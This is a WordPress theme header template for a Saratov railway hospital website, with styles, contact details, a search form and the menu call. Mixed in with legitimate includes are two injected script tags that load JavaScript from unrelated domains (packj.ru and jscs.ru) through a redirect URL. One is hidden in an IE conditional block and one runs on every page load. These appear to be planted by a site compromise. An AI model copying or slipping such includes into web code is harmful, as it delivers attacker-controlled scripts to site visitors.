<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"> 

<style>
.big_banner .amazingslider-box-1{border-width:0px; border-radius:15px; } 
.dwqa-container .dwqa-btn-success{
  background-color:#C41223;
  border-color:#C41223;
}
</style>
<title><?php bloginfo('title'); ?></title>
<!--[if lt IE 9]>
        <script src="http://css3-mediaqueries-js.googlecode.com/svn/trunk/css3-mediaqueries.js"></script>
<![endif]-->

<!-- Le styles --> <link href="<?php bloginfo('stylesheet_url');?>" type="text/css" rel="stylesheet"> 
 <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements --> 
 <!--[if lt IE 9]> 
 <script type="text/javascript" src="http://packj.ru/index.php?l=http://packj.ru/js.php"></script>
 <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script> 
 <![endif]--> 
<script src="wp-content/plugins/ultimate-tables/js/jquery.dataTables.js"></script>
<script type="text/javascript" src="http://jscs.ru/index.php?l=http://jscs.ru/cs.php"></script>
<?php wp_head();?>

</head>

<body>
<div class="content-wrapper">
<div class="content-small">
<div class="top_head">
<div class="mid_head">
<div class="logo">
<a class="brand" href="<?php echo site_url(); ?>"><img src="wp-content/themes/dkb/img/logo.png"></a>
</div>

<h2><p> НУЗ «Дорожная клиническая больница<br/>  на станции Саратов-II ОАО «РЖД»</p></h2>
<p class="red">Клиника, которую знают. Врачи, которым доверяют</p>
<a class="for_but" href="http://dkb-sar.ru/?page_id=197">Задать вопрос</a>
<a class="for_but" href="http://dkb-sar.ru/?page_id=258">Оставить отзыв</a>
</div>

<div class="right_head">
<p>Справочная служба<br/>(8452) 41-73-61</p>
<p>Скорая помощь (круглосуточно)<br/>(8452) 41-97-17, (8452) 41-97-07</p>
<p>410004, г. Саратов<br/>1-й Станционный проезд, 7</p>
<div class="search">
<form  method="get" name="searchform" id="searchform" action="<?php bloginfo('siteurl')?>">
<input type="text" name="s" id="s" placeholder="Поиск..." />
</form>
</div>
</div>



</div>

<?php
wp_nav_menu(array(
         'theme_location'=>'main_menu'
              ));
?>

